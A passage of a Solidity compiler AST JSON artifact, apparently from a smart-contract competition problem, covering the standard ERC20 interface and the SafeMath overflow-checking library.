												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1053,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1155:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1154:9:3"
									},
									"scope": 1093,
									"src": "1081:83:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": "@dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\nthat someone may use both the old and the new allowance by unfortunate\ntransaction ordering. One possible solution to mitigate this race\ncondition is to first reduce the spender's allowance to 0 and set the\ndesired value afterwards:\nhttps://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\n     * Emits an {Approval} event.",
									"id": 1065,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1061,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1058,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1065,
												"src": "1850:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1057,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1850:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1060,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 1065,
												"src": "1867:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1059,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1867:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1849:33:3"
									},
									"returnParameters": {
										"id": 1064,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1063,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1065,
												"src": "1901:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1062,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1901:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1900:6:3"
									},
									"scope": 1093,
									"src": "1833:74:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": "@dev Moves `amount` tokens from `sender` to `recipient` using the\nallowance mechanism. `amount` is then deducted from the caller's\nallowance.\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     * Emits a {Transfer} event.",
									"id": 1076,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1072,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1067,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1076,
												"src": "2247:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1066,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2247:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1069,
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"scope": 1076,
												"src": "2263:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1068,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2263:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1071,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 1076,
												"src": "2282:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1070,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2282:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2246:51:3"
									},
									"returnParameters": {
										"id": 1075,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1074,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1076,
												"src": "2316:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1073,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2316:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2315:6:3"
									},
									"scope": 1093,
									"src": "2225:97:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"anonymous": false,
									"documentation": "@dev Emitted when `value` tokens are moved from one account (`from`) to\nanother (`to`).\n\n     * Note that `value` may be zero.",
									"id": 1084,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1083,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1078,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 1084,
												"src": "2514:20:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1077,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2514:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1080,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1084,
												"src": "2536:18:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1079,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2536:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1082,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1084,
												"src": "2556:13:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1081,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2556:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2513:57:3"
									},
									"src": "2499:72:3"
								},
								{
									"anonymous": false,
									"documentation": "@dev Emitted when the allowance of a `spender` for an `owner` is set by\na call to {approve}. `value` is the new allowance.",
									"id": 1092,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1091,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1086,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1092,
												"src": "2751:21:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1085,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2751:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1088,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1092,
												"src": "2774:23:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1087,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2774:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1090,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1092,
												"src": "2799:13:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1089,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2799:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2750:63:3"
									},
									"src": "2736:78:3"
								}
							],
							"scope": 1094,
							"src": "182:2635:3"
						}
					],
					"src": "0:2819:3"
				},
				"id": 3
			},
			"赛题-预赛/第四题/contracts/SafeMath.sol": {
				"ast": {
					"absolutePath": "赛题-预赛/第四题/contracts/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							1226
						]
					},
					"id": 1227,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1095,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:4"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": "@dev Wrappers over Solidity's arithmetic operations with added overflow\nchecks.\n\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\nin bugs, because programmers usually assume that an overflow raises an\nerror, which is the standard behavior in high level programming languages.\n`SafeMath` restores this intuition by reverting the transaction when an\noperation overflows.\n\n * Using this library instead of the unchecked operations eliminates an entire\nclass of bugs, so it's recommended to use it always.",
							"fullyImplemented": true,
							"id": 1226,
							"linearizedBaseContracts": [
								1226
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 1119,
										"nodeType": "Block",
										"src": "926:114:4",
										"statements": [
											{
												"assignments": [
													1105
												],
												"declarations": [
													{
														"constant": false,
														"id": 1105,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"scope": 1119,
														"src": "937:9:4",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1104,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "937:7:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1109,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1108,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1106,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1097,
														"src": "949:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1107,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1099,
														"src": "953:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "949:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "937:17:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1113,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1111,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1105,
																"src": "973:1:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1112,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1097,
																"src": "978:1:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "973:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 1114,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "981:29:4",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 1110,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "965:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1115,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "965:46:4",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1116,
												"nodeType": "ExpressionStatement",
												"src": "965:46:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1117,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1105,
													"src": "1031:1:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1103,
												"id": 1118,
												"nodeType": "Return",
												"src": "1024:8:4"
											}
										]
									},
									"documentation": "@dev Returns the addition of two unsigned integers, reverting on\noverflow.\n\n     * Counterpart to Solidity's `+` operator.\n\n     * Requirements:\n- Addition cannot overflow.",
									"id": 1120,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1100,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1097,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"scope": 1120,
												"src": "872:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1096,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "872:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1099,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"scope": 1120,
												"src": "883:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1098,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "883:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "871:22:4"
									},
									"returnParameters": {
										"id": 1103,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1102,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1120,
												"src": "917:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1101,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "917:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "916:9:4"
									},
									"scope": 1226,
									"src": "859:181:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1144,
										"nodeType": "Block",
										"src": "1382:117:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1132,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1130,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1124,
																"src": "1401:1:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1131,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1122,
																"src": "1406:1:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1401:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 1133,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1409:32:4",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 1129,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "1393:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1134,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1393:49:4",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1135,
												"nodeType": "ExpressionStatement",
												"src": "1393:49:4"
											},
											{
												"assignments": [
													1137
												],
												"declarations": [
													{
														"constant": false,
														"id": 1137,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"scope": 1144,
														"src": "1453:9:4",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1136,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1453:7:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1141,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1140,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1138,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1122,
														"src": "1465:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1139,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1124,
														"src": "1469:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1465:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1453:17:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1142,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1137,
													"src": "1490:1:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1128,
												"id": 1143,
												"nodeType": "Return",
												"src": "1483:8:4"
											}
										]
									},
									"documentation": "@dev Returns the subtraction of two unsigned integers, reverting on\noverflow (when the result is negative).\n\n     * Counterpart to Solidity's `-` operator.\n\n     * Requirements:\n- Subtraction cannot overflow.",
									"id": 1145,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1125,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1122,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"scope": 1145,
												"src": "1328:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1121,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1328:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1124,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"scope": 1145,
												"src": "1339:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1123,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1339:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1327:22:4"
									},
									"returnParameters": {
										"id": 1128,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1127,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1145,
												"src": "1373:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1126,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1373:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1372:9:4"
									},
									"scope": 1226,
									"src": "1315:184:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1178,
										"nodeType": "Block",
										"src": "1817:404:4",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1156,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1154,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1147,
														"src": "2053:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1155,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2058:1:4",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2053:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1160,
												"nodeType": "IfStatement",
												"src": "2049:47:4",
												"trueBody": {
													"id": 1159,
													"nodeType": "Block",
													"src": "2061:35:4",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1157,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2083:1:4",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 1153,
															"id": 1158,
															"nodeType": "Return",
															"src": "2076:8:4"
														}
													]
												}
											},
											{
												"assignments": [
													1162
												],
												"declarations": [
													{
														"constant": false,
														"id": 1162,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"scope": 1178,
														"src": "2108:9:4",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1161,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2108:7:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1166,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1165,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1163,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1147,
														"src": "2120:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1164,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1149,
														"src": "2124:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2120:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2108:17:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1172,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1170,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1168,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1162,
																	"src": "2144:1:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 1169,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1147,
																	"src": "2148:1:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "2144:5:4",
